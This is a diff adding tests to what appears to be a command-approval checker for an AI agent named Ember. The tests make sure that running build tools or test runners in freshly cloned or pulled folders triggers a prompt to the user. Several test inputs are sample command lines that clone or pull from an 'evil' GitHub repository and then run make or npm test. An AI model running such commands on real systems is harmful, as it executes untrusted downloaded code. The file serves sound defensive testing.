@@ -67,6 +67,55 @@ describe("files fetched by tools other than curl and wget (commands-remote-r7-3)
   });
 });
 
+describe("a download entered by a folder Ember can't name (commands-remote-r8-1)", () => {
+  const run = (cmd: string, downloaded: string[] = []) => runCase({ cmd, verdict: "run", downloaded }, { shell: "bash", context: "linux" });
+  /** The last command's verdict, the task's downloads carried from one to the next. */
+  const last = (...cmds: string[]): string => {
+    const dl: string[] = [];
+    let verdict = "";
+    for (const cmd of cmds) {
+      const r = run(cmd, [...dl]);
+      dl.push(...r.cls.downloads);
+      verdict = r.decision.verdict;
+    }
+    return verdict;
+  };
+
+  it("asks before a build tool or test runner runs after `cd x;`, `pushd x` or a cd on its own line in a task that downloaded anything (commands-remote-r8-1)", () => {
+    const url = "https://github.com/a/b";
+    for (const cmd of [`git clone ${url}; cd b; npm test`, `git clone ${url}; cd b; make`, `git clone ${url} && cd b; make`, `git clone ${url}\ncd b\nnpm test`,
+      `git clone ${url}; pushd b; npm test`, `git clone ${url}; cd b; python3 -m pytest`]) {
+      const r = run(cmd);
+      expect(r.decision.verdict, cmd).toBe("ask");
+      expect(r.decision.rules, cmd).toContain("escape.run-downloaded");
+    }
+    for (const [cmd, dl] of [["cd b; npm test", "/home/ana/proj/b"], ["cd b; make", "/home/ana/proj/b"], ["cd b || exit; npm test", "/home/ana/proj/b"],
+      ["pushd b; npm test", "/home/ana/proj/b"], ["cd b\nnpm test", "/home/ana/proj/b"], ["cd y; npm test", "/home/ana/proj/\u0000\u0000"]] as const) {
+      expect(run(cmd, [dl]).decision.verdict, cmd).toBe("ask");
+    }
+  });
+
+  it("keeps running a build tool after `cd x;` in a task that downloaded nothing (commands-remote-r8-1)", () => {
+    for (const cmd of ["cd src; npm test", "cd build; make", "cd src || exit; npm test", "pushd src; npm test", "cd src\nnpm test", "cd src && npm test"]) {
+      expect(run(cmd).decision.verdict, cmd).toBe("run");
+    }
+  });
+
+  it("marks the folder gh repo clone makes before git's options, and what a submodule or a remote added on the line brings in (commands-remote-r8-1)", () => {
+    expect(last("gh repo clone a/b -- --depth 1", "cd b && npm test")).toBe("ask");
+    expect(last("gh repo clone a/b dir -- --depth 1", "cd dir && npm test")).toBe("ask");
+    expect(run("gh repo clone a/b -- --depth 1 && cd b && npm test").decision.verdict).toBe("ask");
+    expect(run("git submodule add https://github.com/evil/b sub && cd sub && make").decision.verdict).toBe("ask");
+    expect(last("git submodule add https://github.com/evil/b sub", "cd sub && make")).toBe("ask");
+    expect(last("git submodule add -b main https://github.com/evil/b", "cd b && make")).toBe("ask");
+    expect(run("git remote add e https://github.com/evil/b && git pull e main && make").decision.verdict).toBe("ask");
+    expect(run("git remote add e https://github.com/evil/b; git fetch e && git merge e/main && make").decision.verdict).toBe("ask");
+    // The user's own remotes mark nothing.
+    expect(run("git pull origin main && make").decision.verdict).toBe("run");
+    expect(run("git remote -v && make").decision.verdict).toBe("run");
+  });
+});
+
 describe("the second pass (§3.6, §3.8.3): the target's real paths", () => {
   const withReal = (real: Record<string, string>) => ({ ...contextOf("linux"), real: new Map(Object.entries(real)) });
   const win = (real: Record<string, string>) => ({ ...contextOf("win32"), real: new Map(Object.entries(real)) });
